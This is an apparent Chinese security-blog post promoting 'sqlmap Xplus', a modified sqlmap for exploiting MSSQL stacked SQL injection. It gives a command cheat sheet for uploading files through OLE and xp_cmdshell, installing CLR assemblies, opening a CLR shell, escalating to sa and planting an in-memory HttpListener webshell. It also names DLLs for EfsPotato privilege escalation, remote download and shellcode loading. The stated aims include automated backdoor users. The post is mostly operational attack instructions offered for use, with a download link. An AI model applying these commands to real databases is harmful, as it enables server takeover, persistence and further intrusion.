#  sqlmap Xplus 基于 sqlmap，对经典的数据库注入漏洞利用工具进行二开！V1.6版本   
shine  无影安全实验室   2025-02-07 09:23  
  
免责声明：  
本篇文章仅用于技术交流，  
请勿利用文章内的相关技术从事非法测试  
，  
由于传播、利用本公众号无影安全  
实验室所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号无影安全实验室及作者不为此承担任何责任，一旦造成后果请自行承担！  
如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
  
朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把"**无影安全实验室**  
"设为星标，这样更新文章也能第一时间推送！  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3GHDOauYyUGbiaHXGx1ib5UxkKzSNtpMzY5tbbGdibG7icBSxlH783x1YTF0icAv8MWrmanB4u5qjyKfmYo1dDf7YbA/640?&wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
安全工具  
  
  
  
## 0x01 工具介绍  
  
sqlmapxplus在众多的地区性攻防演练中，SQL Server数据库堆叠注入仍有较高的爆洞频率，但因为一些常见的演练场景限制，如不出网、低权限、站库分离、终端防护、上线困难、权限维持繁琐等，仅一个--os-shell已经难满足我们的需求。  
  
sqlmapxplus 基于sqlmap，对经典的数据库漏洞利用工具进行二开，参考各种解决方法，增加MSSQL数据库注入的利用方式。目前已完成部分二开，包括ole、xpcmdshell两种文件上传、内存马上传、clr安装功能，能够实现mssql注入场景下的自动化注入内存马、自动化提权、自动化添加后门用户、自动化远程文件下载、自动化shellcode加载功能。  
1. **20250121更新说明**  
：更新工具的交互方式、 更新CLR注入利用方式  
  
1. 针对实际网络过程中dll传输损失导致clr安装失败的问题  
  
更新CLR落地加载功能（需要落地dll）和一键数据库CLR加载功能（无需落地dll）可根据场景选择合适的利用方法、  
  
临时增加 --check-file 选项判断dll文件是否成功落地目标主机、  
  
临时增加--check-clr 判断用户自定义函数是否在数据库中加载成功、  
  
需要注意的是 --check-file 和 --check-clr 选项存在判断不准确的问题，仅供参考  
  
实践过程中可能受url编码等影响，会导致注入利用失败  
  
1. 为什么使用上传过程中会出现dll放大的问题 转换为十六进制落地再还原导致的文件增大，如字母 A 经过十六进制 会转换 为 41，增大一倍，ole文件上传极限为20kb  
  
1. 自定义clr的问题（已完成） install-clr修改为，需要指定自定义的clr.dll路径，在提示框输入 用户自定义类名 用户自定义方法名 clr_shell模式下执行clr函数的方式修改为：用户自定义function 传入参数（已完成）。  
  
## 0x02 功能介绍  
  
```
File system access:
--xp-upload   upload file by xp_cmdshell 
--ole-upload  upload file by ole 
--check-file  use xp_fileexis check file exist 
--ole-del  	  delete file by ole 
--ole-read    read file content by ole 
--ole-move    move file by ole 
--ole-copy    copy file by ole 

Operating system access:
--enable-clr        enable clr 
--disable-clr       disable clr
--enable-ole        enable ole 
--check-clr   check user-defined functions in the database
--del-clr   delete user-defined functions in the database
--install-clr1      install clr1
--install-clr2      install clr2
--clr-shell         clr shell 
--to-sa             current db to sa
--sharpshell-upload1  sharpshell upload1
--sharpshell-upload2  sharpshell upload2 

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFES0h4zHG2LJaibAJSIP1GuWaREwXFu4okqwNfq7icOIYjgqZSz6vibIh4ACnw09CR0mQPXxibkkj8IDrg/640?wx_fmt=png&from=appmsg "")  
## 0x03 工具使用  
```
1、文件操作功能:

#开启 ole 利用功能
python sqlmap.py -r/-u xxx --enable-ole 

# 通过 ole 上传文件
python sqlmap.py -r/-u xxx --ole-upload local_file_path --file-dest remote_file_path

# 通过 ole 删除指定文件
python sqlmap.py -r/-u xxx --ole-del remote_file_path

# 通过 ole 阅读指定文件
python sqlmap.py -r/-u xxx --ole-read remote_file_path

# 通过 ole 移动并重命名文件
python sqlmap.py -r/-u xxx --ole-move remote_file_path1 --file-dest remote_file_path

# 通过 ole 复制文件
python sqlmap.py -r/-u xxx --ole-copy remote_file_path1 --file-dest remote_file_path2

# 通过 xp_cmdshell 上传文件
python sqlmap.py -r/-u xxx --xp-upload local_file_path --file-dest remote_file_path

# 使用 xp_fileexis 来检查文件是否存在
python sqlmap.py -r/-u xxx --check-file remote_file_path

# 通过 ole 实现的HttpListener内存马上传方式

# 默认上传至c:\Windows\tasks\listen.tmp.txt，需要以system权限运行
python sqlmap.py -r/-u xxx --sharpshell-upload2 

# 通过 xp_cmdshell实现的HttpListener内存马上传方式

# 默认上传至c:\Windows\tasks\listen.tmp.txt，需要以system权限运行
python sqlmap.py -r/-u xxx --sharpshell-upload1 
```  
  
```
2、CLR相关的功能:

# 开启 clr 利用功能
python sqlmap.py -r/-u xxx --enable-clr 

# 关闭 clr 利用功能
python sqlmap.py -r/-u xxx --disable-clr

# 查询数据库中是否存在用户自定义函数
python sqlmap.py -r/-u xxx --check-clr

# 进入 clr 安装模式
python sqlmap.py -r/-u xxx --install-clr

# 进入 clr-shell 命令交互模式
python sqlmap.py -r/-u xxx --clr-shell 

# 删除用户自定义函数
python sqlmap.py -r/-u xxx --del-clr

# clr dll 参考如下，更多其他dll请参考星球获取
# 存储过程类名Xplus，存储过程函数名需要注意大小写，分别为
# ClrExec、ClrEfsPotato、ClrDownload、ClrShellcodeLoader# 对应项目目录下单独功能的dll，分别为clrexec.dllclrefspotato.dllclrdownload.dllclrshellcodeloader.dl
```  
  
## 0x04 工具下载  
  
**点****击关注**  
**下方名片****进入公众号**  
  
**回复关键字【250207****】获取**  
**下载链接**  
  
  
